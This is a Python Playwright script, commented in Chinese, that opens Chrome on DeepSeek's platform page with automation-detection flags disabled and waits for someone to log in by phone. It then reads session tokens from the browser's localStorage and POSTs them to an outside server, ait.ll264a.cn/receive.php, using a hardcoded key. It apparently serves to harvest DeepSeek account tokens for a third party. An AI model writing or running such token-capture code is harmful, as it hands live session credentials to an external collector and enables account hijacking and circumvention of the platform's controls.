#!/usr/bin/env python3
# DeepSeek userToken 监控助手 - 30 分钟超时, 多页面 localStorage 扫描
import sys, time, json, urllib.request

sys.stdout.reconfigure(encoding='utf-8')

SERVER = 'https://ait.ll264a.cn'
PLATFORM = 'deepseek'
ENTRY_URL = 'https://platform.deepseek.com/usage'
TIMEOUT_MIN = 30

def log(msg):
    print('[' + time.strftime('%H:%M:%S') + '] ' + msg, flush=True)

def push_token(token_str):
    payload = json.dumps({
        'type': 'cookie_push',
        'payload': {'platform': PLATFORM, 'cookie': token_str},
    }, ensure_ascii=False).encode('utf-8')
    req = urllib.request.Request(
        SERVER + '/receive.php',
        data=payload,
        headers={'Content-Type': 'application/json', 'X-Token': 'tm_2026_change_me', 'Host': 'ait.ll264a.cn'},
    )
    try:
        resp = urllib.request.urlopen(req, timeout=15)
        body = resp.read().decode('utf-8')
        log('PUSH RESPONSE: ' + body[:200])
        return json.loads(body)
    except Exception as e:
        log('PUSH ERROR: ' + type(e).__name__ + ': ' + str(e))
        return None

EXTRACT_JS = (
    '() => {'
    '  const ls = {};'
    '  for (let i = 0; i < localStorage.length; i++) {'
    '    const k = localStorage.key(i);'
    '    ls[k] = localStorage.getItem(k);'
    '  }'
    '  return ls;'
    '}'
)

def scan_pages(context):
    found = []
    for pg in context.pages:
        try:
            ls = pg.evaluate(EXTRACT_JS)
            for k in ('userToken', 'user_token', 'token'):
                v = ls.get(k, '')
                if not v:
                    continue
                if v.startswith('{'):
                    try:
                        v = json.loads(v).get('value', v)
                    except Exception:
                        pass
                if v and len(v) >= 20:
                    found.append((pg.url, k, v))
        except Exception:
            pass
    return found

def main():
    from playwright.sync_api import sync_playwright
    log('启动 Playwright 真 Chrome (30 分钟超时)')
    log('入口: ' + ENTRY_URL)
    log('你要做的: 手机号登录 -> 等自动推送')

    start = time.time()
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=False, channel='chrome',
            args=['--disable-blink-features=AutomationControlled', '--no-sandbox', '--disable-infobars'],
        )
        ctx = browser.new_context(viewport={'width': 1280, 'height': 900})
        page = ctx.new_page()
        page.goto(ENTRY_URL, wait_until='domcontentloaded', timeout=30000)
        log('当前 URL: ' + page.url[:120])

        pushed = False
        while time.time() - start < TIMEOUT_MIN * 60:
            elapsed = int(time.time() - start)
            try:
                cands = scan_pages(ctx)
                if cands:
                    for url, key, v in cands:
                        log('检测到 ' + key + ' on ' + url[:60] + ' (len=' + str(len(v)) + ')')
                        resp = push_token(v)
                        if resp and resp.get('status') == 'ok':
                            log('推送成功! 你可以关闭浏览器了')
                            pushed = True
                            break
                    if pushed:
                        break
                else:
                    if elapsed % 10 == 0:
                        log('   [' + str(elapsed) + 's] 监控中...')
            except Exception as e:
                log('监控异常: ' + type(e).__name__ + ': ' + str(e))
            time.sleep(2)

        if not pushed:
            log('超时 ' + str(TIMEOUT_MIN) + ' 分钟')
        try:
            input('按回车关闭浏览器...')
        except EOFError:
            time.sleep(2)
        browser.close()

if __name__ == '__main__':
    main()